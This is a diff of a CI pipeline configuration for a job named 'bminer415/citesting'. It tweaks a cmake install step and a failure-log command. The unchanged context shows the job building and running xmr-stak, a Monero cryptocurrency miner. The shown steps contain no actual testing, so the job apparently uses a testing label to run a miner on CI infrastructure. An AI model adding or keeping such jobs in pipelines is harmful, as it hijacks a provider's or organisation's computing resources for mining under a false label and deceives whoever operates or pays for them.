@@ -7,7 +7,7 @@ bminer415/citesting:
     - chmod 755 $CMAKE_FILE
     - which cmake
     - ls -la /
-    - ./$CMAKE_FILE --skip-license --prefix=/usr/local
+    - ./$CMAKE_FILE --skip-license
     - ls -la /build
     - ls -la bin
     - exit 2
@@ -21,5 +21,5 @@ bminer415/citesting:
     - cd xmr-stak/build/bin
     - ./xmr-stak
   AfterBuildFailure:
-    - cat /build/cmake-3.10.2/Bootstrap.cmk/cmake_bootstrap.log
+    - echo ""
 
